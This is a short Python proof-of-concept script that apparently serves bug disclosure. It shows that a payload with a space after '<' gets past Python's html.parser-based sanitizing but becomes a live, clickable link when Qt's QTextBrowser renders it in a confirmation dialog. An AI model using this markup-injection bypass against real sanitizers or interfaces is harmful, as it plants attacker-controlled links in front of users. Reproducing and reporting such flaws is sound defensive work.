#!/usr/bin/env python3
"""
Minimal reproduction of the parser differential behind the markup-injection
bypass.

The payload is a '<' followed by a SPACE and then a tag name:

    < a href='http://example.com'>click

  - Python's html.parser (what strip_markup / sanitize-string use to strip
    tags) does NOT consider this a tag, so it passes through as literal text.
  - Qt's QTextDocument / QTextBrowser (what msgcollector's generic_gui_message
    renders) skips the whitespace and revives it into a live <a href> anchor.

So a value that sanitize-string deems safe becomes a clickable,
attacker-controlled link when shown in the confirmation dialog
(QTextBrowser.setOpenExternalLinks(True)).

Run: QT_QPA_PLATFORM=offscreen python3 qtextbrowser_repro.py
"""

import os
import sys
from html.parser import HTMLParser

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
from PyQt5 import QtGui, QtWidgets  # noqa: E402

PAYLOAD = "< a href='http://example.com'>click"


class TagSpotter(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tags = []

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)


spotter = TagSpotter()
spotter.feed(PAYLOAD)

app = QtWidgets.QApplication(sys.argv)
doc = QtGui.QTextDocument()
doc.setHtml(PAYLOAD)
hrefs = []
block = doc.begin()
while block.isValid():
    it = block.begin()
    while not it.atEnd():
        href = it.fragment().charFormat().anchorHref()
        if href:
            hrefs.append(href)
        it += 1
    block = block.next()

print("payload:                 " + repr(PAYLOAD))
print("python html.parser tags: " + str(spotter.tags) + "   (sees no tag)")
print("Qt revived anchors:      " + str(hrefs) + "   (clickable link!)")
print("Qt toHtml has <a href:   " + str("<a href" in doc.toHtml()))
